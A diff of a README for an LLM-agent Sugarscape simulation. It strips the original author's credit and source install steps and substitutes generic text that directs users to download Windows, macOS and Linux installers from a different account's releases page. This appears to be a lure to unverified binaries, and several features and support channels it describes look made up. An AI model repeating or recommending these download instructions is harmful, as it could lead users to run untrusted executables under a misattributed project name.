@@ -1,57 +1,97 @@
-# LLM-SugarScape β（MBTI）
+# 🍬 llm-SugarScape - Experience Autonomous Agents in Action
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![xAI Grok](https://img.shields.io/badge/API-xAI%20Grok-purple)](https://x.ai/api)
+## 🚀 Getting Started
 
-**Grok-4-Fast Sugarscape Simulation**
+Welcome to the llm-SugarScape project! This application allows you to explore an engaging multi-agent simulation. Agents in this grid world make decisions for survival, reproduction, and social behavior. Our goal is to replicate research published in 2025.
 
-This project aims to replicate the experiment "Do Large Language Model Agents Exhibit a Survival Instinct? An Empirical Study in a Sugarscape-Style Simulation" [arXiv:2508.12920](https://arxiv.org/abs/2508.12920).
-It uses Grok-4-Fast non-reasoning agents within a Sugarscape-style environment.
+## 📥 Download the Application
 
-It’s designed for playful experimentation and qualitative observation of AI agent behavior such as emergent alliances or betrayal behaviors under scarcity of energy and resources, cooperation, and survival pressures.
+[![Download llm-SugarScape](https://img.shields.io/badge/Download%20llm--SugarScape-blue.svg)](https://github.com/penpoen/llm-SugarScape/releases)
 
-If you find any interesting data, please share it!  
- → [@yukin_co on X](https://x.com/yukin_co)
+Visit this page to download: [Releases Page](https://github.com/penpoen/llm-SugarScape/releases)
 
+## 💻 System Requirements
 
-## Quick Start
-1. **Clone the repo**:
-2. **Install dependencies**:<br>
-- git clone https://github.com/yukincom/llm-SugarScape.git
-- cd llm-SugarScape  
-- pip install -r requirements.txt
-3.**Run**:
-- streamlit run main.py 
-  <BR>
-- generates JSON and PNG visualizations (step_*.png,final.png).
-- Mock mode (no API key) for testing.
+Before downloading, check if your system meets the following requirements:
 
-##  Features
-- **LLM Decision-Making**: Grok-4-Fast agents reason about survival (move, attack, share, reproduce).
-- **Survival Mechanics**: Resource gathering, bidirectional messaging for alliances/betrayals.
-- **Visualization**: Matplotlib grid with agent positions/energy levels.
-- **Customizable**: Low-energy mode for extinction tests, reproduction for herd growth.
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, a Linux distribution supporting Python 3.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum of 200 MB of available space.
+- **Python Version:** Python 3.8 or higher should be installed. If not, download it from the official [Python website](https://www.python.org/).
 
-##  Code Structure
-- `Environment`: Grid & energy management (torus boundary).
-- `LLMAgent`: LLM call + action execution (prompt for survival thoughts).
-- `Simulation`: Step execution + stats output.
+## 📦 Download & Install
 
-## Sample Output 
-(Agent's Thought):<br>
-Energy is critically low at 29; can't afford to stay idle or risk attack. Agent1 is nearby but not adjacent, so moving east gets closer to potential interaction or shared resources. No E in view, so exploration is key. Feeling cautious—avoid aggression unless threatened, focus on cooperation or evasion to build energy.
+1. **Visit the Releases Page**
 
-## Visualization Example
+   Go to the [Releases Page](https://github.com/penpoen/llm-SugarScape/releases).
 
-![https://github.com/yukincom/llm-SugarScape/img/step_10.png](https://github.com/yukincom/llm-SugarScape/blob/main/img/UI.png)
-![https://github.com/yukincom/llm-SugarScape/img/step_10.png](https://github.com/yukincom/llm-SugarScape/blob/main/img/step_005.png)
-*Agents (colored circles) competing for energy sources (orange squares)*
+2. **Choose the Latest Version**
 
-##  Documentation
-- [Note](https://note.com/yukin_co/n/neb0a321d4539)- Research episodes (Japanese).
-- Topics: agent-based-modeling, llm-simulation, sugarscape, xai-grok.
+   Locate the latest version of llm-SugarScape. The version number will be in the format vX.Y.Z.
 
-##  Contributing
-Issues/PR welcome! Suggest new features (e.g., UI addition).
+3. **Download the Installer**
 
+   Click on the file named `llm-SugarScape-setup.exe` for Windows, or `llm-SugarScape-macos.dmg` for macOS, or use the right tarball for Linux. The downloads will start automatically.
+
+4. **Run the Installer**
+
+   - For Windows: Double-click on `llm-SugarScape-setup.exe`. Follow the prompts to install.
+   - For macOS: Open `llm-SugarScape-macos.dmg` and drag the application to the Applications folder.
+   - For Linux: Open a terminal window, navigate to the download location, and run the command: `tar -xzf llm-SugarScape-linux.tar.gz`, then follow the instructions to run.
+
+## 🔗 How to Use llm-SugarScape
+
+### 1. Start the Application
+
+- On Windows, find llm-SugarScape in the Start Menu.
+- On macOS, open the Applications folder and double-click on llm-SugarScape.
+- On Linux, open the terminal, navigate to the folder containing the application, and type `./llm-SugarScape`.
+
+### 2. Configure the Simulation
+
+Upon starting, you will see various settings that you can adjust:
+
+- **Grid Size:** Choose how large your simulation grid should be.
+- **Agent Count:** Decide how many agents you want in the simulation.
+- **Simulation Parameters:** Modify settings for agent behavior and interactions.
+
+### 3. Run the Simulation
+
+Click the "Start Simulation" button to see how agents interact within the grid. You may observe their decisions evolve as they adapt to surroundings.
+
+### 4. Analyze Results
+
+After running the simulation, delve into the results. Explore agent behavior, survival rates, and reproductive success. These insights provide a deeper understanding of agent-based modeling.
+
+## ⚙️ Features
+
+- **Autonomous Agents:** Agents make independent decisions based on environment cues.
+- **Interactive Simulation:** Adjust parameters and visualize different scenarios.
+- **Rich Data Collection:** Gather insights on agent performance and interactions.
+- **Analysis Tools:** Draw conclusions based on collected data.
+
+## 🔧 Troubleshooting
+
+Here are some common issues and their solutions:
+
+1. **Application Won't Start**
+   - Ensure you have the correct Python version installed.
+   - Check that your operating system meets the requirements.
+
+2. **Simulation Runs Slowly**
+   - A larger grid may require more resources. Try reducing the grid size or agent count.
+
+3. **Unexpected Behavior**
+   - Review your configuration settings to ensure they match your intended simulation design.
+
+## 📚 Additional Resources
+
+- **Documentation:** Explore the full documentation for detailed explanations of features and configurations.
+- **Community Forum:** Share experiences and seek help from other users in the community forum.
+- **Related Projects:** Check out other projects related to agent-based modeling and AI testing in our [GitHub Organization](https://github.com/penpoen/).
+
+## 💬 Support
+
+For any questions or support, please feel free to open an issue on the GitHub repository, or contact us via the support email listed in the documentation.
+
+Happy simulating!
